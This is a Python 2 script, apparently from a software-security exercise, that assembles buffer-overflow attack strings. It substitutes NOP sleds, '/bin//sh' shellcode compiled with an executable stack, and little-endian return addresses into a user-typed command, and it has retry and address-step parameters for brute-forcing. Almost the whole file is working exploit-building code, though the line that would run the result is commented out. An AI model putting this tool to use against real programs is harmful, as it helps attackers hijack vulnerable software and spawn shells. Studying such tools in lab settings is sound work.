import subprocess

varList=[]
varDict={'$NOP;':"\"\\x90\"",'$SHELLCODE;':"/bin//sh"}
varIndexDict={}
paramDict = {'-CLP_maxtry':10, '-CLP_addr_change':100}

def getInput(display_msg):
    # return input(display_msg)
    return raw_input(display_msg)


def getShellCode(my_command):
    subprocess.Popen("gcc -m32 -z execstack prog_shell.c", shell=True, stdout=subprocess.PIPE).stdout.read()
    return subprocess.Popen("./a.out " + my_command, shell=True, stdout=subprocess.PIPE).stdout.read()


def getExploitString(shell_command):
    shellcode = getShellCode(shell_command)
    tmpShellCode = "\"" + str(shellcode[:len(shellcode) - 1]) + "\""
    return tmpShellCode


def getEndianAddress(address):
	newAddress = ""
	for i in range(0,len(address),2):
		newAddress = "\\x" + address[i] + address[i+1] + newAddress
	return "\""+newAddress+"\""


# variable define by user will start with $ and terminate with ; => $var;
def getCommand():
    string = getInput("Enter command: ")
    val = ""
    while(string.find('$') != -1):
        sindex = string.find('$')
        eindex = string.find(';')
        if eindex == -1:
            print("Incorrect variable declaration. Use ';' to terminate variable name.")
            exit(1)
        var = string[sindex:eindex+1]
        if varDict.__contains__(var):
            val = varDict[var]
        else:
            val = getInput(var + " = ")
        if var == "$shellcode;":
            val = getExploitString(val)
        if var == "$address;":
            val = getEndianAddress(val)
        string = string.replace(var,val)

    return string


# parameters defined as " -<param> value "
def getParameters(string):
    commandList = []
    commandList = string.split(" ")
    for param in paramDict:
        if commandList.__contains__(param):
            index = commandList.index(param)
            paramDict[param] = commandList[index+1]
            commandList.remove(commandList[index+1])
            commandList.remove(commandList[index])
    command = ""
#   command = "echo `python -c 'print "
    for cmd in commandList:
        command = command + cmd + " "
#    command = command + "'`"
    return command


if __name__ == "__main__":
    print(paramDict)
    attackCommand = getCommand()
    attackCommand = getParameters(attackCommand)
    print(attackCommand)
    print(paramDict)

#    print(subprocess.Popen(attackCommand, shell=True, stdout=subprocess.PIPE).stdout.read())

